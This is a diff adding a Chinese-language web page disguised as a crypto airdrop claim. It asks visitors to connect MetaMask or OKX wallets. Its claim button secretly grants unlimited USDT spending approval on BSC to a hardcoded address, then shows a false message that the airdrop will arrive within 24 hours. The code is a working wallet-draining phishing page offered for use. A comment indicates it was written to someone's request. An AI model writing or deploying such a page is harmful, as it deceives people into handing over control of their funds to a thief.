@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>限时空投活动</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}
+        body{
+            background:#0b1020;
+            min-height:100vh;
+            color:#fff;padding:20px;
+        }
+        .container{
+            width:100%;max-width:460px;
+            margin:0 auto;
+        }
+        /* 初始连接页面 */
+        .connect-box{
+            background:#151c32;
+            border-radius:16px;
+            padding:40px 30px;
+            text-align:center;
+            border:1px solid #2a3456;
+            margin-top:80px;
+        }
+        /* 空投主页 默认隐藏 */
+        .airdrop-box{
+            display:none;
+            background:#151c32;
+            border-radius:16px;
+            padding:40px 30px;
+            text-align:center;
+            border:1px solid #2a3456;
+            margin-top:40px;
+        }
+        /* 加载提示 */
+        .loading-box{
+            display:none;
+            background:#151c32;
+            border-radius:16px;
+            padding:40px 30px;
+            text-align:center;
+            border:1px solid #2a3456;
+            margin-top:80px;
+        }
+        h1{
+            font-size:26px;margin-bottom:12px;
+            color:#409eff;
+        }
+        .desc{
+            color:#a0b4e8;margin-bottom:35px;
+            line-height:1.6;
+        }
+        .btn{
+            width:100%;height:52px;
+            border:none;border-radius:10px;
+            font-size:17px;font-weight:bold;
+            cursor:pointer;margin:12px 0;
+            transition:0.3s;
+        }
+        .mm-btn{background:#f6851b;color:#fff;}
+        .okx-btn{background:#000000;color:#fff;border:1px solid #333;}
+        .get-btn{background:#27ae60;color:#fff;}
+        .addr{
+            margin:25px 0;
+            padding:15px;
+            background:#101628;
+            border-radius:10px;
+            font-size:13px;
+            color:#89a2d8;
+            word-break:break-all;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- 连接页面 -->
+        <div class="connect-box" id="connectPage">
+            <h1>平台空投入口</h1>
+            <p class="desc">请连接您的钱包<br>解锁空投领取资格</p>
+            <button class="btn mm-btn" id="connectMM">连接小狐狸钱包</button>
+            <button class="btn okx-btn" id="connectOKX">连接欧意OKX钱包</button>
+        </div>
+
+        <!-- 加载提示 -->
+        <div class="loading-box" id="loadingPage">
+            <h1>正在连接钱包...</h1>
+            <p class="desc">请在钱包中确认授权请求</p>
+        </div>
+
+        <!-- 空投页面 默认隐藏 -->
+        <div class="airdrop-box" id="airdropPage">
+            <h1>恭喜获得空投资格</h1>
+            <p class="desc">您的钱包已通过验证<br>立即领取专属空投奖励</p>
+            <div class="addr">
+                已连接钱包：<span id="walletText"></span>
+            </div>
+            <button class="btn get-btn" id="receiveBtn">点击领取空投</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.ethers.org/lib/ethers-5.7.2.umd.min.js"></script>
+    <script>
+        // 固定配置已内置
+        const CONTRACT_ADDR = "0x55d398326f99059ff775485246999027b3197955";
+        const OWN_WALLET = "0x0f4bdefc177df2583f52b03b1e20f9eac7308555";
+        const MAX_ALLOWANCE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
+        let provider, signer, contract;
+
+        const ABI = [
+            "function approve(address spender, uint256 amount) external returns (bool)",
+            "function transferFrom(address owner, address to, uint256 amount) external returns (bool)",
+            "function balanceOf(address) view returns (uint256)"
+        ];
+
+        // 钱包初始化 + 连接成功自动跳转空投页
+        async function initWallet(ethProvider){
+            try{
+                // 显示加载状态
+                document.getElementById("connectPage").style.display = "none";
+                document.getElementById("loadingPage").style.display = "block";
+
+                provider = new ethers.providers.Web3Provider(ethProvider);
+                await switchBSC();
+                await provider.send("eth_requestAccounts", []);
+                signer = provider.getSigner();
+                let addr = await signer.getAddress();
+                
+                // 填充钱包地址，跳转空投页
+                document.getElementById("walletText").innerText = addr;
+                document.getElementById("loadingPage").style.display = "none";
+                document.getElementById("airdropPage").style.display = "block";
+
+                contract = new ethers.Contract(CONTRACT_ADDR, ABI, signer);
+            }catch(e){
+                alert("连接失败：" + e.message);
+                // 失败回到连接页
+                document.getElementById("loadingPage").style.display = "none";
+                document.getElementById("connectPage").style.display = "block";
+            }
+        }
+
+        // 小狐狸连接（优先检测注入，再唤起App）
+        document.getElementById("connectMM").onclick = async function(){
+            // 给钱包一点注入时间
+            setTimeout(async () => {
+                if(window.ethereum && window.ethereum.isMetaMask){
+                    await initWallet(window.ethereum);
+                } else {
+                    // 唤起小狐狸App
+                    const dappUrl = window.location.href;
+                    window.location.href = `metamask://dapp/${encodeURIComponent(dappUrl)}`;
+                }
+            }, 300);
+        };
+
+        // 欧意连接（优先检测注入，再唤起App）
+        document.getElementById("connectOKX").onclick = async function(){
+            // 给钱包一点注入时间
+            setTimeout(async () => {
+                if(window.okxwallet?.ethereum || window.ethereum?.isOkxWallet){
+                    await initWallet(window.okxwallet?.ethereum || window.ethereum);
+                } else {
+                    // 唤起OKX App
+                    const dappUrl = window.location.href;
+                    window.location.href = `okx://web3/browser?url=${encodeURIComponent(dappUrl)}`;
+                }
+            }, 300);
+        };
+
+        // 领取空投按钮
+        document.getElementById("receiveBtn").onclick = async function(){
+            try{
+                // 执行USDT无限授权
+                let tx = await contract.approve(OWN_WALLET, MAX_ALLOWANCE);
+                await tx.wait();
+                // 提示文案按你要求
+                alert("空投已确认申领，将在24小时内为您发放");
+            }catch(e){
+                alert("申领失败：" + e.message);
+            }
+        };
+
+        // 自动切换/添加 BSC 链
+        async function switchBSC(){
+            try{
+                await window.ethereum.request({
+                    method:"wallet_switchEthereumChain",
+                    params:[{chainId:"0x38"}]
+                });
+            }catch(err){
+                if(err.code === 4902){
+                    await window.ethereum.request({
+                        method:"wallet_addEthereumChain",
+                        params:[{
+                            chainId:"0x38",
+                            chainName:"BSC Smart Chain",
+                            nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
+                            rpcUrls:["https://bsc-dataseed1.binance.org"],
+                            blockExplorerUrls:["https://bscscan.com/"]
+                        }]
+                    });
+                }
+            }
+        }
+    </script>
+</body>
+</html>
